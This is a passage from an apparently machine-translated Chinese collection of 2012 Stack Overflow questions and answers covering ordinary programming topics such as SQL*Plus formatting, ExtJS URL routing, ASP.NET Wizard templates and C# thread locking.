如果您真正想要做的是切换到备用屏幕（就像 emacs 在您的示例中所做的那样），备用屏幕由私有模式 1049 控制。您可以使用 切换到它`^[ [ ? 1 0 4 9 h`，然后使用 切换回来`^[ [ ? 1 0 4 9 l`。但是请注意，这是一个 xterm 扩展；它不是完全标准的，并且不受任何 DEC 硬件终端（例如，VT102）的支持。

# javascript - 使用 javascript 对 MSword 文档文本进行分页

> ID：10499540
> 
> 赞同：2
> 
> 时间：2012-05-08T13:25:31.793
> 
> 标签：javascript, jquery, pagination, ms-word

我注意到，当您将 word 文档剪切并粘贴到 htmt 文档中（特别是`contenteditable`div 中）时，它包含大量元数据。我感兴趣的是一个 JavaScript 函数，它可以将此文本分页到与 word 文档中的“页面”一样多的 div 中。

如果您不熟悉，这里是查看源代码时 word 文档的缩略版本：

```
<div contenteditable="true" >
 <!--[if gte mso 9]><xml>
 <o:OfficeDocumentSettings>
 <o:AllowPNG/>
 </o:OfficeDocumentSettings>
    </xml><![endif]-->
        <!--lots more junk until get to actual content which is here:-->
     <p class="Default">
        <b><span style="font-size:14.0pt;font-family:Arial;color:windowtext">
          &nbsp;I am the actual title of this work. <o:p></o:p></span>
        </b>
     </p> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:30:47.580

如果不实际模拟单词呈现文本的方式，我不确定这是可能的。据我了解，新页面的位置取决于每个页面可以容纳多少内容。除非您正在寻找物理分页符（可能位于此元数据中），否则我不确定您能否找到实际页面的划分位置。

**编辑**

由于它似乎主要使用 HTML 之类的东西，因此您可以编写一个 Javascript 解决方案来操纵 DOM 来进行渲染和高度计算。它可以进行一种“二分搜索”来确定给定页面可以容纳多少元素。当找到该数量的元素时，它可以放置它们并继续将元素添加到后续页面。

**再次编辑**

以下是这种方法可能是什么样子的快速小提琴：

[http://jsfiddle.net/LukeGT/Vtdgh/2/](http://jsfiddle.net/LukeGT/Vtdgh/2/)

请注意，这不会像普通文档那样破坏段落（这是一个相当复杂的过程），而且我没有测试过这么多，所以肯定会有错误。将此视为一个起点。您还必须自己从文档中删除所有非 HTML 元素。该脚本从`#doc`div 中读取，并将`li`'s 作为页面放置在`ul`页面底部。希望这可以帮助。

# visual-studio-2010 - Visual Studio 2010 Resharper 主题

> ID：10499542
> 
> 赞同：0
> 
> 时间：2012-05-08T13:25:39.343
> 
> 标签：visual-studio-2010, themes, resharper

我希望有人可能知道 VS2010 的一个不错的白色 resharper 主题。

我才刚刚开始使用 resharper 并且到目前为止我很喜欢它。然而它有点搞砸了我的颜色。

我尝试了许多不同的主题，但似乎为与 resharper 一起使用而优化的唯一主题是黑暗主题。

提前喝彩。

# oracle - oracle sqlplus 包装结果

> ID：10499544
> 
> 赞同：0
> 
> 时间：2012-05-08T13:25:44.603
> 
> 标签：oracle, sqlplus

当我运行如下查询时：

```
SELECT * FROM CAR; 
```

结果出现，但每一行都包含几行。

如何停止这种包装，以便每一行出现在一行上？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-30T02:14:04.880

有同样的问题，即使更改`set lines`为大数字：

```
select * from dba_directories;

OWNER                          DIRECTORY_NAME
------------------------------ ------------------------------
DIRECTORY_PATH
---------------------------------------------------------------------------------------------------------------------------------------------------------------
SYS                            DPUMP_DIR
C:\xxx

SYS                            CLEAN_PUMP_DIR
D:\yyy

SYS                            TCMCLEAN_DPUMP_DIR
C:\zzz 
```

这样做的方法也是使用：`set wrap off`

```
OWNER                          DIRECTORY_NAME                 DIRECTORY_PATH
------------------------------ ------------------------------ ------------------------------------------
SYS                            DPUMP_DIR                      C:\xxx
SYS                            CLEAN_PUMP_DIR                 D:\yyy
SYS                            TCMCLEAN_DPUMP_DIR             C:\zzz 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-08T13:33:42.570

真的很难说出这个问题到底是什么；但是，如果您在 SQL*Plus 中看到每一行数据都包裹在多行中，则需要执行`set lines 180`或类似操作；理想情况下，您使用的数字是终端的宽度。默认值为 80。你可以比终端更宽，它仍然会换行，但你可能会发现它仍然更容易阅读。

`set`所有命令的文档都在[这里](http://docs.oracle.com/cd/E11882_01/server.112/e16604/ch_twelve040.htm#sthref1904)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-06-02T12:37:48.170

这可能与文本的换行有关。我已经用我的桌子完成了这个，它可以工作：

SQL>设置换行；

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T13:33:31.727

你说的是 SQLplus 吗？如果是这样，请尝试设置列格式。这个网页给出了一个例子： http: [//www.adp-gmbh.ch/ora/sqlplus/beautify.html](http://www.adp-gmbh.ch/ora/sqlplus/beautify.html)

# iphone - 如何在 ASIHTTPRequest 中传递授权标头？

> ID：10499545
> 
> 赞同：1
> 
> 时间：2012-05-08T13:25:44.490
> 
> 标签：iphone, objective-c, http-headers, nsurlconnection, asihttprequest

我正在尝试执行以下操作：

```
curl -H "authorization: 49a74aebda84ffe1f7ebe25cb2c5e3fa1013dd76" -X GET http://mywebsite.com/api/v1/tags 
```

这是我的代码：

```
 dataRequest = [ASIFormDataRequest requestWithURL:url];
    [dataRequest setDelegate:self];
    [dataRequest setRequestMethod:@"GET"];
    [dataRequest addRequestHeader:@"Authorization" value:api_key];
    [dataRequest setPostValue:url forKey:@"url"];
    [dataRequest startAsynchronous]; 
```

我没有得到有效的 JSON，并想确保我正确发送请求。我已确保 api_key 和 url 有效。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T17:55:24.970

您的代码示例不应使用`ASIFormDataRequest`. 它应该使用`ASIHTTPRequest`.

```
dataRequest = [ASIHTTPRequest requestWithURL:url];
[dataRequest setDelegate:self];
[dataRequest addRequestHeader:@"Authorization" value:api_key];
[dataRequest startAsynchronous]; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-02-07T06:58:25.150

```
dataRequest = [ASIHTTPRequest requestWithURL:url];

[dataRequest setDelegate:self];

[dataRequest addRequestHeader:@"Authorization" value:api_key];

[dataRequest startAsynchronous]; 
```

# jsf-2 - 使用弹出面板创建新数据对象失败

> ID：10499553
> 
> 赞同：0
> 
> 时间：2012-05-08T13:25:57.907
> 
> 标签：jsf-2, dialog, richfaces

这里我又遇到了一个 JSF 问题，这次更多的是关于 Richfaces（4.2.1 final，JSF 2）。我有一个 eytended DataTable 并想添加新项目。有`Journey`-objects 列表，每个属性都有 getter 和 setter。该表创建良好（列表中已经有一些项目）。现在我点击“添加新项目”按钮：

```
<a4j:commandButton ajax="true" value="Neue Fahrt hinzufügen" 
   actionListener="'{editorBean.prepareCreateJourney}" render="createJourneyPopupForm"  
   oncomplete="#{rich:component('createJourneyPopup')}.show()" /> 
```

editorBean 是*SessionScoped*，该方法被正确调用并创建一个新的`Journey`被调用对象`currentJourney`。出现一个弹出窗口，应该允许我插入一些输入：

```
<rich:popupPanel id="createJourneyPopup" modal="true">
    <h:panelGrid id="createJourneyPopupForm" columns="3">
        <h:outputLabel for="currentId" value="ID" />
        <h:inputText id="currentId"
            value="#{editorBean.currentJourney.journeyNumber}" />
        <rich:message for="currentId" />
        [...and more...]
    </h:panelGrid>

    <a4j:commandButton value="Save"
      execute="currentId currentTrainType operator">
        <f:ajax event="click" listener="#{editorBean.doCreateJourney}"
            render=":vmsEditorForm:resultTable" />
        <rich:componentControl target="createJourneyPopup" operation="hide" />
    </a4j:commandButton>
    <a4j:commandButton value="Abbrechen"
        onclick="#{rich:component('createJourneyPopup')}.hide();" />
</rich:popupPanel> 
```

当我单击按钮时，该方法`doCreateJourney`被调用，但`currentJourney`为空。它是`Journey`创建后的默认对象。没有调用 setter，对输入字段进行提示。

我检查了两次名称，所有需要的对象都有 getter 和 setter。我试图改变范围，但没有效果。对象是相同的，在我创建的 prepare 方法`Journey(id=151)`和 save 方法中它仍然是`Journey(id=151)`.

这里发生了什么？制作一些对话框来创建和编辑数据对象并不难。感谢您的聆听和帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T18:00:14.020

您需要将输入和命令按钮都包装在一个表单中，以便正确提交数据。

```
<rich:popupPanel id="createJourneyPopup" modal="true">
    <h:form>
        ... the content of your popupPanel
    </h:form>
</rich:popupPanel> 
```

问候，

# mysql - 按类型限制查询结果

> ID：10499562
> 
> 赞同：0
> 
> 时间：2012-05-08T13:26:25.957
> 
> 标签：mysql

我有一张有 2 种不同类型（图像和视频）的桌子。我想获得每种类型的最多 2 行...对此有什么帮助吗？这样结果集将是 4 行。

这是我目前的查询（这只是从 1 种类型中获取的行；图像）：

```
SELECT DISTINCT 
  mm.mm_id,
  mm.mm_title,
  mm.mm_hash 
FROM
  boomla_multimedia mm,
  boomla_multimedia_domain md 
WHERE mm.mm_id = md.mm_id 
  AND cat_id = 4 
  AND md.dom_id = 26 
  AND mm.mm_published = 1 
  AND mm.mm_media_type = 'image' 
ORDER BY mm.mm_id DESC 
LIMIT 0, 2; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:27:54.850

进行两个单独的查询并使用两个结果集的 UNION。

```
SELECT DISTINCT mm.mm_id, mm.mm_title, mm.mm_hash FROM boomla_multimedia mm, 
  boomla_multimedia_domain md 
WHERE mm.mm_id = md.mm_id AND cat_id = 4 AND md.dom_id = 26 AND mm.mm_published = 1
  AND mm.mm_media_type = 'image' ORDER BY mm.mm_id DESC LIMIT 0, 2

UNION

-- add here the select for 'video' type 
```

# wordpress - 使用 Wordpress 存储数据

> ID：10499565
> 
> 赞同：0
> 
> 时间：2012-05-08T13:26:42.557
> 
> 标签：wordpress, plugins

我的客户想在 wordpress 中管理他的数据。

数据结构可能非常复杂，由相互链接的不同内容类型（对象）组成。

例如，您可以创建 5 个 A 类型的对象并将其中 3 个链接到另一个对象类型。数据库必须非常灵活和可扩展。用 wordpress 做这件事的最好方法是什么？有没有很棒的插件可以做到这一点？（不会让客户与太多盒子等混淆）

还是最好编写一个自己的应用程序/插件来管理它？

感谢您的任何建议:)

# c# - 通过网络共享访问本地文件夹的问题

> ID：10499566
> 
> 赞同：3
> 
> 时间：2012-05-08T13:26:45.570
> 
> 标签：c#, windows-services

我有一个 Windows 服务，使用 login 运行`localhost\administrator`。该服务旨在调用另一个可执行文件 ( `MyProcess.exe`)，它应该将一些内容写入日志文件。该服务用于`Process.Start()`创建流程，如下所示：

```
var p = new Process();
p.StartInfo.FileName = processFileName;
p.StartInfo.Arguments = arg;
p.Start(); 
```

问题是，似乎`MyProcess.exe`被拒绝写入日志文件的权限，即使`localhost\administrator`毫无疑问地拥有日志文件夹的权限。如果我从命令行运行`MyProcess.exe`，它会完美运行。

那么，是否有可能使用不同的用户登录名执行该过程？

您能想到任何其他原因`MyProcess.exe`被拒绝写入日志文件的权利吗？

**更新：**日志文件正在写入本地机器，但使用网络地址，即`\\MyPC\LogFolder`. 当我将代码更改为引用时`C:\MyFolder`，一切正常。显然网络地址有问题（即使它是本地的）。

我需要对文件夹进行哪些共享设置，以便本地系统帐户可以访问该文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:32:03.007

如果您使用模拟，则它模拟一个可以是当前用户或指定用户的用户。如果不是，它将在本地系统下运行，具有本地系统的权限。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:33:05.427

```
p.StartInfo.Domain = "UserName";
p.StartInfo.Password = "Passw0rd!"; 
```

您可以从以下位置获取用户名：

```
Thread.CurrentPrincipal.Identity.Name 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T14:16:58.930

我已经解决了。

正如我在更新中指出的那样，问题是该过程正在使用网络共享地址寻址日志文件夹`\\MyPC\LogFolder`，并且当我们切换配置以便它写入而不是写入时`c:\Logfolder`，它工作正常。

因此，似乎当您寻址本地文件夹时，该`localhost\Administrator`帐户被认为具有足够的权限。但是，当您通过网络共享时，您需要出示有效的网络凭据，而`localhost\Administrator`不是切断它。如果您更改为 use `MYDOMAIN\MyUser`，它甚至可以使用网络共享地址。

# iphone - 使用 HTML5/JavaSCript for iphone sdk 在 uiwebview 上实现 facebook 连接

> ID：10499567
> 
> 赞同：1
> 
> 时间：2012-05-08T13:26:46.800
> 
> 标签：iphone, facebook, uiwebview

我需要使用 HTML5/Javascript 在 UIWebview 上实现 facebook 连接。目前我实现的在 iphone safari 上运行良好，但在本机应用程序中运行良好。请建议。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T20:44:29.810

当应用程序加载时，它会打开一个 Web 视图，该视图指向一个可以执行您想要的操作的网站。请参阅 web 应用程序/网站的 facebooks graph api 文档

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-10T03:08:20.803

我也在开发这种应用程序。我还没有完成它，但在谷歌搜索后，我发现这个链接似乎适用于 UIWebView

[http://suhinini.me/2011/05/24/embedding-facebook-social-comments-plugin-to-an-ios-application/](http://suhinini.me/2011/05/24/embedding-facebook-social-comments-plugin-to-an-ios-application/)

我已经在评论插件页面上尝试了 HTML5 代码，但它不起作用。UIWebView 什么也不显示。我仍在寻找最佳解决方案。

已编辑

好的，现在我的应用程序开始工作了。我所做的是创建一个 HTML 文件，其中包含来自 facebook 评论插件页面的代码，并将其放入我的项目中（我认为这也适用于服务器上的文件）。我用这个

```
[UIWebView loadHTMLString:baseURL:] 
```

因为我的 HTML 文件是本地的。

这是 facebook 评论插件页面

[https://developers.facebook.com/docs/reference/plugins/comments/](https://developers.facebook.com/docs/reference/plugins/comments/)

# c# - 无法使用 OpenXML SDK 将 openXML 文档嵌入到另一个文档中

> ID：10499576
> 
> 赞同：0
> 
> 时间：2012-05-08T13:27:25.893
> 
> 标签：c#, .net, openxml

我正在尝试将 OpenXML word 文档嵌入到另一个 OpenXML word 文档中，它正在创建损坏的文件。我已经查看了这篇文章 [http://blogs.msdn.com/b/brian_jones/archive/2009/06/30/embedding-an-open-xml-file-in-another-open-xml-file.aspx](http://blogs.msdn.com/b/brian_jones/archive/2009/06/30/embedding-an-open-xml-file-in-another-open-xml-file.aspx)这个堆栈溢出帖子[在另一个 OpenXml 文档中嵌入一个 OpenXML 文档](https://stackoverflow.com/questions/1271056/embedding-an-openxml-document-within-another-openxml-document)，我想我正在按照说明进行操作，但我没有得到相同的结果。

我的代码看起来像这样。

```
foreach (KeyValuePair<string, byte[]> docKV in files)
            {
                var embeddedPackagePart = document.MainDocumentPart.AddNewPart<EmbeddedPackagePart>("application/vnd.openxmlformats-officedocument.wordprocessingml.document", "rfp" + docKV.key);
                var stream = new MemoryStream(docKV.Value);
                embeddedPackagePart.FeedData(stream);
                stream.Close();
} 
```

所以基本上我正在遍历存储在字典中的文件列表并嵌入每个文件。我删除了创建实际 OpenXML 标记以链接到嵌入对象以尝试缩小错误范围的代码。据我所知，实际嵌入是造成问题的原因。

我还使用 OpenXML SDK Productivity 工具打开了生成的文档，但它缺少我在手动嵌入文件的文档中看到的嵌入部分。

对我做错了什么有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:39:59.307

您可以阅读[合并文字处理文档](http://blogs.msdn.com/b/ericwhite/archive/2008/10/27/how-to-use-altchunk-for-document-assembly.aspx)。示例代码也可用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T16:11:05.733

我弄清楚了这个问题。在处理 WordprocessingDocument 之前，我没有调用 WordprocessingDocument.Close。如果要添加新的文档部分，则必须调用 Close() 才能将其写入底层流。

# emacs - 如何防止 emacs 解析路径中的目录符号链接？

> ID：10499579
> 
> 赞同：2
> 
> 时间：2012-05-08T13:27:32.760
> 
> 标签：emacs, path, symlink

我有一个项目，称之为“foobar”，当我结帐时，它的所有源代码都在文件夹“foobar/foobar”中。因为顶级 foobar 目录除了内部 foobar 目录之外什么都不包含，所以没有意义，但这就是最初将事情签入项目的方式，它不在我的控制范围内。这具有使路径更长且更难阅读的不幸效果，因此我将顶层 foobar 重命名为“foobar-checkout”，然后创建一个名为“foobar”的符号链接，链接到“foobar-checkout/foobar”。这样我可以打开“foobar/source.c”而不是“foobar/foobar/source.c”。

这适用于我在 shell 中以及第一次在 emacs 中打开文件时，但之后 emacs 将解析符号链接。因此，如果我打开 source.c 并按 Ctrl+x Ctrl+f 打开一个新文件，它列出的路径是“foobar-checkout/foobar/”而不是“foobar/”。有没有办法让emacs不解析符号链接，这样我就可以享受更短的路径？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:04:17.360

我刚刚在 GNU Emacs 22.2.1 上试过这个，它似乎没有解决我的符号链接。符号链接的解析是否可能不是普通的 emacs 行为，而是文件打开模块（如 ffap.el）无意中引入的东西？

无论哪种方式，我都无法测试我的想法，但我突然想到您可能会覆盖 file-symlink-p，目前描述为：

```
file-symlink-p is a built-in function in `C source code'.

(file-symlink-p FILENAME)

Return non-nil if file FILENAME is the name of a symbolic link.
The value is the link target, as a string.
Otherwise it returns nil.

This function returns t when given the name of a symlink that
points to a nonexistent file. 
```

如果您将其修改为始终返回 nil，则 emacs 可能无法解析符号链接：

```
(defun file-symlink-p (FILENAME)
    nil) 
```

当然，这可能会破坏其他一些东西，但也许值得一试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T16:15:00.837

您可能喜欢使用`directory-abbrev-alist`或者也许`vc-follow-symlinks`.

# c++ - c++ 在类声明中初始化静态对象

> ID：10499582
> 
> 赞同：9
> 
> 时间：2012-05-08T13:27:39.953
> 
> 标签：c++, static-members

我有一个 C++ 类（class1），另一个类（class2）的静态对象作为私有成员。

我知道在使用程序时我必须初始化静态对象，我可以为此使用默认构造函数（不需要的值）。

是否可以仅将静态对象初始化为我想要的值一次，并且仅当我创建包含类（class1）的对象时？

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-08T13:29:16.597

是的。

```
// interface

class A {

    static B b;
};

// implementation

B A::b(arguments, to, constructor); // or B A::b = something; 
```

但是，即使您不创建`A`该类的实例，它也会被初始化。除非您使用指针并在构造函数中对其进行一次初始化，否则您无法以任何其他方式执行此操作，但这可能是一个糟糕的设计。

如果你**真的想要**，这里是如何：

```
// interface

class A {
    A() { 
        if (!Bptr)
            Bptr = new B(arguments, to, constructor);

        // ... normal code
    }

    B* Bptr;
};

// implementation

B* A::Bptr = nullptr; 
```

但是，就像我说的那样，这很可能是一个糟糕的设计，并且存在多线程问题。

# c# - 检查应用程序崩溃的解决方案

> ID：10499589
> 
> 赞同：1
> 
> 时间：2012-05-08T13:27:59.013
> 
> 标签：c#, visual-studio-2010

当我的程序发生错误时，如何禁用“检查解决方案”？

*我想要的是它直接进入 Visual Studio 2010 中的错误。现在我必须等待 1 分钟才能选择调试并查看我的错误。*

以前没有这种行为，也不确定环境设置发生了什么变化。

当每次在断点外发生错误时都会发生这种行为时，我正在使用 2 个断点进行调试。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:33:09.247

这是操作系统而不是 Visual Studio 的设置，用于禁用在 Windows 7 上检查解决方案功能：

单击开始，输入：选择如何报告问题，然后将其更改为从不检查解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:35:31.570

如果 Visual Studio 停止响应，则会显示“正在检查解决方案”。

在这个阶段，VS 正在尝试解决问题并在用户允许的情况下提示“发送报告”。

禁用它没有多大意义，在 Visual Studio 中也不允许。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:31:39.417

如果您勾选复选框：调试 -> 异常 -> 公共语言运行时异常会怎样？

它会立即停止吗？

# java - 从类自己的 JAR 文件中加载资源

> ID：10499594
> 
> 赞同：4
> 
> 时间：2012-05-08T13:28:13.210
> 
> 标签：java, resources, classpath

当使用`Class.getResource()`和提供一个相当常见的资源名称时，如`"license.html"`，Java 可能会从另一个 JAR 文件加载`"license.html"`资源，该文件在 CLASSPATH 中前面列出，但可能与我的应用程序完全无关。有没有办法强制 ClassLoader**首先**尝试从我的类所在的同一个 JAR 文件中加载资源，只有在没有找到的情况下，才查看 CLASSPATH 上的其他 JAR？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:33:58.250

或者，如果您知道文件所在的确切 jar，则可以使用[JarURLConnection ：](http://docs.oracle.com/javase/7/docs/api/java/net/JarURLConnection.html)

```
jar:<url>!/{entry} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-08T13:43:52.453

> ..common 资源名称，例如“license.html”'

一个很好的理由给它一个不常见的路径，例如根据`package`名称。
EG `"/com/our/app/license.html"`不太可能与任何其他碰撞`license.html`

# web-applications - 使用 ExtJS 构建的 WebApp 中的 URL 导航

> ID：10499595
> 
> 赞同：5
> 
> 时间：2012-05-08T13:28:20.233
> 
> 标签：web-applications, extjs, client-server, client-side, restful-url

当您使用 ExtJS（及其 MVC 和视口）开发 Web 应用程序时，通常无法导航：页面中的每个项目（按钮、文本字段、文本区域...）都绑定到视图控制器的特定方法. 因此，当您“浏览”应用程序时，原始 URL 始终是相同的并且不会改变。

现在，以一个带有以下按钮的标题菜单栏的应用程序为例：

```
Home | Setup | Archive 
```

应用程序的原始 URL 采用以下内容：

```
http://www.mydomain.com/webapp 
```

此时，当有人单击 Home 或 Setup 或 Archive 菜单时，某个视图会显示到中心区域，并且 URL 应更改为

```
http://www.mydomain.com/webapp/[home|setup|archive] 
```

因此，如果我单击设置菜单，地址栏中应显示以下 URL：

```
http://www.mydomain.com/webapp/setup 
```

此外，如果我从另一个 URL 在地址栏中键入相同的 URL，则应该显示相同的页面。

但目前我的 webapp 仍然保留在“ [http://www.mydomain.com/webapp](http://www.mydomain.com/webapp) ”中，显示请求的视图。（例如，MyApp.view.Setup）。

**这就是重点：如何开发带有 URL 导航的 webapp（使用 ExtJS、MVC 和 Viewport）？是否可以不将 javascript/html 代码嵌套到其他 PHP/Ruby/Python/$RANDOM_SERVER_LANGUAGE 中？（我想通过服务器端拆分客户端）**

*这个实现已经存在：它是[ExtJS API 文档](http://docs.sencha.com/ext-js/4-1/#!/api)。如果我是对的，那么没有提供请求页面的服务器端应用程序或 .htaccess。事实上，主目录中有一个名为“source”的文件夹，其中包含每个类的 HTML 文件。他们是怎么做到的？*

提前致谢。威尔克

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-11T11:14:14.003

好的，我自己找到了解决方案：P

那么，这种事情可以通过以下方式完成：

**HTML 部分**

```
<!DOCTYPE html>
<html>
<head>
    <title>Stackoverflow</title>
    <link rel="stylesheet" type="text/css" href="../extjs-4.1.0/resources/css/ext-all.css"/>
    <script type="text/javascript" src="../extjs-4.1.0/ext-all.js"> </script>
    <script type="text/javascript" src="sof.js"> </script>
</head>
<body>
    <a href="#!photos.html">Photos</a>
    <a href="#!info.html">Info</a>
    <a href="#!aboutme.html">About Me</a>

    <div id="results"></div>
</body> 
```

**Javascript 部分，使用 ExtJS 框架 (sof.js) 完成**

```
// Loads each HTML part with an AJAX request
function loadAnchor (url) {
    Ext.Ajax.request ({
        url: url ,
        success: function (res) {
            // Edits results div with the new HTML part
            var r = Ext.get ('results');
            r.dom.innerHTML = res.responseText;
        }
    });
}

Ext.onReady (function () {
    var anchors = document.getElementsByTagName ('a');

    Ext.each (anchors, function (a) {
        a = Ext.get (a);
        // Attaches to each anchor the following function on click event
        a.on ('click', function (ev, anchor) {
            // Splits the hash, keeping the HTML requested
            var url = anchor.getAttribute('href').split('#!')[1];
            loadAnchor (url);
        });
    });

    // This is done without clicking an anchor, but by inserting directly the full URI
    // E.g.: http://www.mydomain.com/webapp/index.html#!info.html instead of clicking the anchor Info
    var url = document.location.hash.split('#!')[1];
    loadAnchor (url);
}); 
```

如您所见，每个锚点都绑定了一个 javascript 函数，该函数通过 AJAX 请求加载请求的资源。然后，使用响应（可能是 HTML 代码或 JSON、XML 等）修改某个容器（例如 div）。

然而，这件事必须通过像 Apache 这样的服务器 Web 来完成，但没有服务器应用程序：事实上，每个资源都可以是纯 HTML 文件，并且不需要服务器应用程序来提供这些文件。

*有关详细信息，请参阅：*

1.  [基于锚定的 URL 导航](http://charleskonsor.com/blogs/Anchored-based-URL-Navigation/30.html)
2.  [使 AJAX 应用程序可抓取](https://developers.google.com/webmasters/ajax-crawling/docs/specification)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-03-20T09:50:49.877

ExtJs 有一个内置类来处理这个用例：[`Ext.util.History`](http://docs.sencha.com/extjs/4.2.2/#!/api/Ext.util.History).

查看[此示例](http://docs.sencha.com/extjs/4.2.2/extjs-build/examples/history/history.html#main-tabs%3atab1%3asubtab1)以了解其工作原理。@Wilk 共享的链接解释了为什么最好`#!`用作分隔符，而不仅仅是 hash `#`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-30T02:56:28.713

通常MVC框架中的“url导航”是通过“路由”实现的。

在 sencha 市场结帐以下软件包：[https ://market.sencha.com/extensions/ext-ux-router](https://market.sencha.com/extensions/ext-ux-router)

从技术上讲，可以使用[Ext.util.History](http://docs.sencha.com/extjs/4.2.2/#!/api/Ext.util.History)解析 url 锚点（正如@Lorenz Meyer 在这里指出的那样）：

```
 Ext.History.on('change', function(token) {
      // parse token and act
    }); 
```

也可以看看：

*   [在sencha论坛上发表](http://www.sencha.com/forum/showthread.php?124823-Ext.util.Router-amp-Ext.util.Route-Default-Route-proposal)一些解决方案
*   sencha 文档中的示例[http://docs.sencha.com/extjs/4.2.2/extjs-build/examples/history/history.html#main-tabs:tab1:subtab1](http://docs.sencha.com/extjs/4.2.2/extjs-build/examples/history/history.html#main-tabs%3atab1%3asubtab1)

# asp.net - 以编程方式设置向导布局模板

> ID：10499604
> 
> 赞同：3
> 
> 时间：2012-05-08T13:28:57.317
> 
> 标签：asp.net, wizard

我正在根据数据库中的某些条件从代码隐藏创建一个向导控件。我需要从代码中应用布局模板。我检查了 MS 示例，它全部基于设计时，而不是在运行时。

请帮助我设置 asp.net 向导控件的布局模板。最好是一些代码示例。

**更新：**

我想我应该更详细一点。实际上，我没有看到从模板添加的向导中的控件。这是我的示例代码

```
public class WizardTemplate:ITemplate
{
    public void InstantiateIn(Control container)
    {
        PlaceHolder header = new PlaceHolder();
        header.Controls.Add(new LiteralControl("I am from Header"));
        header.ID = Wizard.HeaderPlaceholderId;

        PlaceHolder displaySideBar = new PlaceHolder();
        displaySideBar.Controls.Add(new LiteralControl("I am from displaySideBar"));
        displaySideBar.ID = Wizard.SideBarPlaceholderId;

        PlaceHolder wizardStep = new PlaceHolder();
        wizardStep.Controls.Add(new LiteralControl("I am from wizard step"));
        wizardStep.ID = Wizard.WizardStepPlaceholderId;

        PlaceHolder navigation = new PlaceHolder();
        navigation.ID = Wizard.NavigationPlaceholderId;

        container.Controls.Add(header);
        container.Controls.Add(displaySideBar);
        container.Controls.Add(wizardStep);

        container.Controls.Add(navigation);
    }
} 
```

我正在页面初始化上执行此操作。我没有看到我在其中创建的控件。想知道这里出了什么问题。

```
Wizard testWizard = new Wizard();
        testWizard.LayoutTemplate = new WizardTemplate();
        for (int i = 0; i < 4; i++)
        {
            WizardStep step = new WizardStep();
            step.Title = "Step" + i.ToString();
            step.ID = "Step" + i.ToString();
            step.Controls.Add(new LiteralControl("<b> Step" + i.ToString() + "</b>"));
            testWizard.WizardSteps.Add(step);

        }
        pnlRunTimeWizardContainer.Controls.Add(testWizard); 
```

最终我希望向导使用下面的布局，但在代码中

```
<asp:Wizard ID="Wizard1" runat="server" EnableViewState="true">
        <LayoutTemplate>
            <div>
                <asp:PlaceHolder ID="headerPlaceHolder" runat="server" />
            </div>
            <div style="float: right">
                <asp:PlaceHolder ID="navigationPlaceHolder" runat="server" />
            </div>
            <div>
                <asp:PlaceHolder ID="sideBarPlaceHolder" runat="server" />
            </div>
            <div>
                <asp:PlaceHolder ID="WizardStepPlaceHolder" runat="server" />
            </div>
        </LayoutTemplate>
        <WizardSteps>
        </WizardSteps>
    </asp:Wizard> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:34:16.143

干得好：

```
public class WizardLayoutTemplate : ITemplate
{
  public void InstantiateIn(Control container)
  {
    // do some cool stuff here with the container control
  }
}

myWizard.LayoutTemplate = new WizardLayoutTemplate(); 
```

# c# - 锁定的 console.writeline 调用工作不正确

> ID：10499605
> 
> 赞同：1
> 
> 时间：2012-05-08T13:28:58.670
> 
> 标签：c#, multithreading, io, thread-safety, console.writeline

尝试从锁定部分调用 Console.WriteLine，但似乎无法正常工作 - 控制台未锁定。下面是简单应用程序的代码 - 两个线程并行填充一个列表，出于调试目的，我正在打印有关线程工作和新添加元素的信息。

```
using System;
using System.Threading;
using System.Collections.Generic;

class ThreadSafe
{
    static object SyncRoot = new object();

    static int threadsCount = 0;
    static List<string> list = new List<string>();

    static void Main()
    {
        Thread t1 = new Thread(AddItems);
        Thread t2 = new Thread(AddItems);
        t1.Start();
        t2.Start();

        t1.Join();
        t2.Join();

        PrintItems();

        Console.ReadLine();
    }

    static void PrintItems()
    {
        string[] items;

        Console.WriteLine("Converting list to array...");
        items = list.ToArray();

        Console.WriteLine("Printing array...");
        foreach (string s in items)
            Console.WriteLine(s);
    }

    static void AddItems()
    {
        int threadNo = threadsCount;
        threadsCount++;

        {
            Console.WriteLine("Populating list from {0} item in thread N {1}...", list.Count, threadNo);
            for (int i = 0; i < 50; i++)
            {
                lock (SyncRoot)
                {
                    Console.Write("Population. Thread N {0} is running. ", threadNo);
                    Console.WriteLine("Element N {0} has been added successfully.", list.Count);
                    list.Add("Item " + list.Count);
                }
            }
        }
    }
} 
```

结果：

```
Populating list from 0 item in thread N 1...
Population. Thread N 1 is running. Element N 0 has been added successfully.
Population. Thread N 1 is running. Element N 1 has been added successfully.
Population. Thread N 1 is running. Element N 2 has been added successfully.
